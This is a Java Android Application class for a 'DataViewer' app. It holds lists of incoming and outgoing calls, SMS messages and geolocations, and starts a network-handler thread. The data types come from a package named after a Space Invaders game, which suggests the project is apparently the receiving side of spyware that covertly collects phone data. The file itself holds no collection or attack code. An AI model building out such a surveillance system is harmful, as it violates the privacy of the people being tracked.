package com.cst.DataViewer;

import android.app.Application;
import com.cst.spaceinvaders.shared.data.Geolocation;
import com.cst.spaceinvaders.shared.data.IncomingCall;
import com.cst.spaceinvaders.shared.data.IncomingSMS;
import com.cst.spaceinvaders.shared.data.OutgoingCall;

import java.util.ArrayList;
import java.util.List;

public class DataViewerApp extends Application
{
    private List<IncomingCall> m_incomingCalls;
    private List<OutgoingCall> m_outgoingCalls;
    private List<IncomingSMS> m_incomingSmses;
    private List<Geolocation> m_geolocations;
    private NetworkHandler m_networkHandler;
    private Thread m_handlerThread;

    @Override
    public void onCreate()
    {
        m_incomingCalls = new ArrayList<IncomingCall>();
        m_outgoingCalls = new ArrayList<OutgoingCall>();
        m_incomingSmses = new ArrayList<IncomingSMS>();
        m_geolocations = new ArrayList<Geolocation>();
        m_networkHandler = new NetworkHandler(this);
        m_handlerThread = new Thread(m_networkHandler);
        m_handlerThread.start();
    }

    public List<IncomingCall> incomingCalls()
    {
        return m_incomingCalls;
    }

    public List<OutgoingCall> outgoingCalls()
    {
        return m_outgoingCalls;
    }

    public List<IncomingSMS> incomingSmses()
    {
        return m_incomingSmses;
    }

    public List<Geolocation> geolocations()
    {
        return m_geolocations;
    }
}
